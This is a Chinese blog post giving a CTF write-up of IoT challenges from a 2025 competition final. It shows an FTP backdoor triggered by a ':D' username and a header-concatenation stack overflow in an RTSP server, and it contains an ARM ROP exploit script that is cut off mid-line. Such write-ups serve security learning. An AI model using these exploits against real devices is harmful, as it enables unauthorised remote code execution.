+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT ME
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links"
+                        >
+                            <span>
+                                链接
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">15</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">西湖论剑2025决赛IOT安全挑战(漏洞挖掘部分)</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="https://avatars.githubusercontent.com/u/173450716?s=400&u=ccae31065054a3a4bf4d8766ed7d532442c26449&v=4">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">两只羊</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-12-05 10:08:59</span>
+        <span class="mobile">2025-12-05 10:08:59</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-12-05 11:04:40</span>
+            <span class="mobile">2025-12-05 11:04:40</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/IOT/">IOT</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学习IOT安全，刚好队友把西湖论剑决赛的板子带回来了，就来试着做一做。</p>
+<p>相比24年给的openwrt开发版上进行应急响应，今年提供的树莓派少了很多硬件上的操作，直接ssh上去就可以做题了，省略了固件提取的部分，甚至给了完整的镜像，更偏向CTF的解题模式。</p>
+<p>目前只做了pwn的部分，漏洞点本身不难，但优化去符号的程序给分析带来了极大的困难，需要具备一定的逆向能力。</p>
+<p>题目镜像链接</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://pro-resource.dasctf.com/resource/oss/ef6e9de7fc5772f8fccd0d96d254f67d.zip" >https://pro-resource.dasctf.com/resource/oss/ef6e9de7fc5772f8fccd0d96d254f67d.zip<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="连接树莓派"><a href="#连接树莓派" class="headerlink" title="连接树莓派"></a>连接树莓派</h2><p>插入烧录好的sd卡，使用usb线连接上设备</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/34d23889d9927aa2b1f6e97a59f3cca5.jpg"
+                      alt="34d23889d9927aa2b1f6e97a59f3cca5"
+                ></p>
+<p>查看题目手册</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201170215253.png"
+                      alt="image-20251201170215253"
+                ></p>
+<p>在windows环境上连接时，一开始会被识别位COM口，需要安装USB Ethernet&#x2F;RNDIS Gadget的驱动然后更改</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201164859803.png"
+                      alt="image-20251201164859803"
+                ></p>
+<p>配置好网卡的ip，ping通树莓派后就可以ssh上去做题了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201170116882.png"
+                      alt="image-20251201170116882"
+                ></p>
+<h2 id="pass-9-levels-7"><a href="#pass-9-levels-7" class="headerlink" title="pass_9_levels-7"></a>pass_9_levels-7</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201193633831.png"
+                      alt="image-20251201193633831"
+                ></p>
+<p>难度为非常容易。flag1是virtualbox protector混淆过的checker，看一眼就会爆炸</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/381faa3d492e78ddcb55920fc55feeb3.png"
+                      alt="381faa3d492e78ddcb55920fc55feeb3"
+                ></p>
+<p>主要还是分析chall1用户起来的dasftpd，这是一个ftp的服务端，我们直接能找到一个&#x2F;bin&#x2F;sh的后门</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201203253738.png"
+                      alt="image-20251201203253738"
+                ></p>
+<p>查看引用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201203308525.png"
+                      alt="image-20251201203308525"
+                ></p>
+<p>大概的意思就是，当ftp连接时用户名中有:D字样就会开启一个监听25329端口的正向shell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201203327397.png"
+                      alt="image-20251201203327397"
+                ></p>
+<p>在进行操作前</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201202455041.png"
+                      alt="image-20251201202455041"
+                ></p>
+<p>在ftp连接时输入用户名admin:D，服务直接卡住</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201202546720.png"
+                      alt="image-20251201202546720"
+                ></p>
+<p>回来发现反弹shell的端口成功开启</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201202536258.png"
+                      alt="image-20251201202536258"
+                ></p>
+<p>成功连上shell，执行.&#x2F;flag1 chall1后拿到flag</p>
+<p>DASCTF{8b7a732a6363147fce9a2918930c125a}</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201203206991.png"
+                      alt="image-20251201203206991"
+                ></p>
+<h2 id="pass-9-levels-8"><a href="#pass-9-levels-8" class="headerlink" title="pass_9_levels-8"></a>pass_9_levels-8</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201203634858.png"
+                      alt="image-20251201203634858"
+                ></p>
+<p>给了一个RTSP的服务端，我们可以先大致了解一下RTSP协议</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/blog_migrate/7c7111383d898a85f7e28a84b5788213.png"
+                      alt="img"
+                ></p>
+<p>简单看看文件信息，保护全关，只要能找到一个栈溢出基本就拿下了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251202091536205.png"
+                      alt="image-20251202091536205"
+                ></p>
+<p>使用telnet连接，首先看看是否支持接口</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS rtsp://10.10.10.133:8554 RTSP/1.0</span><br><span class="line">CSeq: 1</span><br><span class="line">User-Agent: TelnetTest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 1</span><br><span class="line">Date: Sun, Mar 16 2025 19:36:54 GMT</span><br><span class="line">Public: OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, GET_PARAMETER, SET_PARAMETER</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251205103326398.png"
+                      alt="image-20251205103326398"
+                ></p>
+<p>尝试请求媒体文件，用ida获取的路径试一下</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DESCRIBE rtsp://10.10.10.133:8554/Pic_Stream RTSP/1.0</span><br><span class="line">CSeq: 2</span><br><span class="line">Accept: application/sdp</span><br><span class="line">User-Agent: TelnetTest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RTSP/1.0 404 File Not Found, Or In Incorrect Format</span><br><span class="line">CSeq: 2</span><br><span class="line">Date: Sun, Mar 16 2025 19:45:29 GMT</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>使用qemu仿真调试</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">twogoat@twogoat-virtual-machine:~/Desktop/xihulunjian/9-8/rootfs$ tree</span><br><span class="line">.</span><br><span class="line">├── baby_rtsp</span><br><span class="line">├── lib</span><br><span class="line">│   ├── libxcc_s.so.1</span><br><span class="line">│   ├── libx.so</span><br><span class="line">│   ├── libx.so.6</span><br><span class="line">│   ├── libxtdc++.so.6</span><br><span class="line">│   └── lx-linux.so.3</span><br><span class="line">└── qemu-arm-static</span><br><span class="line"></span><br><span class="line">1 directory, 7 files</span><br><span class="line">twogoat@twogoat-virtual-machine:~/Desktop/xihulunjian/9-8/rootfs$ <span class="built_in">sudo</span> <span class="built_in">chroot</span> . ./qemu-arm-static ./baby_rtsp</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>成功开启服务并访问</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251202184759523.png"
+                      alt="image-20251202184759523"
+                ></p>
+<p>开启调试</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251202184918814.png"
+                      alt="image-20251202184918814"
+                ></p>
+<p>先尝试一下路径名是否存在溢出</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DESCRIBE rtsp://10.10.10.133:8553/Pic_StreamAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA RTSP/1.0</span><br><span class="line">CSeq: 2</span><br><span class="line">Accept: application/sdp</span><br><span class="line">User-Agent: TelnetTest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RTSP/1.0 404 File Not Found, Or In Incorrect Format</span><br><span class="line">CSeq: 2</span><br><span class="line">Date: Sun, Mar 16 2025 19:45:29 GMT</span><br></pre></td></tr></table></figure></div>
+
+<p>这里数组大小为432字节</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251203212053817.png"
+                      alt="image-20251203212053817"
+                ></p>
+<p>但在超过一定长度限制后，会直接返回400 Bad Request</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;DESCRIBE rtsp://192.168.197.134:4645/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x19\x14E\x11 RTSP/1.0\r\nCSeq: 2\r\nAccept: application/sdp\r\nUser-Agent: TelnetTest\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">==================== SERVER RESPONSE ====================</span><br><span class="line">RTSP/<span class="number">1.0</span> <span class="number">400</span> Bad Request</span><br><span class="line">Date: Tue, Dec 02 <span class="number">2025</span> <span class="number">11</span>:<span class="number">17</span>:05 GMT</span><br><span class="line">Allow: OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, GET_PARAMETER, SET_PARAMETER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=========================================================</span><br></pre></td></tr></table></figure></div>
+
+<p>在处理请求的地方，对各部分长度的限制读取长度为最大200字节，应该不是这里的漏洞</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251202193059044.png"
+                      alt="image-20251202193059044"
+                ></p>
+<p>如果DESCRIBE一直通过不了，那SETUP, TEARDOWN, PLAY, PAUSE, GET_PARAMETER, SET_PARAMETER就全部不可用了，而且程序也没提供推流功能(ANNOUNCE)，那么漏洞应该在别的地方</p>
+<p>我们可以看到程序中有对GET和POST的处理，应该支持RTSP Over HTTP，我们浏览器直接访问一下，发现先会对请求头进行校验</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204152206999.png"
+                      alt="image-20251204152206999"
+                ></p>
+<p>其中x-sessioncookie和Accept是必须的，就是在这里产生了漏洞</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204143736446.png"
+                      alt="image-20251204143736446"
+                ></p>
+<p>经过测试发现，当传入所需要的字段有多个，比如传入</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x-sessioncookie: AAAA</span><br><span class="line">x-sessioncookie: BBBB</span><br><span class="line">x-sessioncookie: CCCC</span><br></pre></td></tr></table></figure></div>
+
+<p>会将他们拼接一起，最后的x-sessioncookie值即为</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAABBBBCCCC</span><br></pre></td></tr></table></figure></div>
+
+<p>并且长度只会检查每一次获取的字段不超过200字节，它根本不会检查最后总共有没有超过200字节，这里就会造成栈溢出漏洞</p>
+<p>我们传入多个A，可以看到我们已经完全控制了栈</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/813294cd67255d6691331550afce8995.png"
+                      alt="813294cd67255d6691331550afce8995"
+                ></p>
+<p>存放Accept字段的地址设置在了bss段，我们可以轻松构造rop链</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204150631122.png"
+                      alt="image-20251204150631122"
+                ></p>
+<p>找一波gadget</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204154633631.png"
+                      alt="image-20251204154633631"
+                ></p>
+<p>在树莓派上测试，成功执行命令</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204151513241.png"
+                      alt="image-20251204151513241"
+                ></p>
+<p>poc</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;baby_rtsp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#TARGET_IP = &quot;192.168.197.134&quot;</span></span><br><span class="line">TARGET_IP = <span class="string">&quot;10.10.10.133&quot;</span></span><br><span class="line">TARGET_PORT = <span class="number">4646</span></span><br><span class="line"></span><br><span class="line">addr_system = <span class="number">0x00011888</span>    </span><br><span class="line">addr_shell  = <span class="number">0x0006EA70</span></span><br><span class="line"></span><br><span class="line">pop_r3_pc = <span class="number">0x00011654</span></span><br><span class="line">mov_r0_r3_pop_r4_pc = <span class="number">0x00020f28</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raw_socket_request</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Connecting to <span class="subst">&#123;TARGET_IP&#125;</span>:<span class="subst">&#123;TARGET_PORT&#125;</span> ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">10</span>)</span><br><span class="line">        s.connect((TARGET_IP, TARGET_PORT))</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        payload += <span class="string">b&quot;GET /Pic_Stream HTTP/1.1\r\n&quot;</span></span><br><span class="line">        payload += <span class="string">b&quot;CSeq: 1\r\n&quot;</span></span><br><span class="line">        payload += <span class="string">b&quot;User-Agent: twogoat\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">404</span>):</span><br><span class="line">            payload += <span class="string">b&quot;x-sessioncookie: A\r\n&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            payload += <span class="string">b&quot;x-sessioncookie: &quot;</span> + p32(<span class="number">0x11451419</span>) + <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">        payload += <span class="string">b&quot;x-sessioncookie: &quot;</span> + p32(pop_r3_pc) + <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">        payload += <span class="string">b&quot;x-sessioncookie: &quot;</span> + p32(addr_shell) + <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">        payload += <span class="string">b&quot;x-sessioncookie: &quot;</span> + p32(mov_r0_r3_pop_r4_pc) + <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">        payload += <span class="string">b&quot;x-sessioncookie: &quot;</span> + p32(<span class="number">0x114514</span>) + <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">        payload += <span class="string">b&quot;x-sessioncookie: &quot;</span> + p32(addr_system) + <span 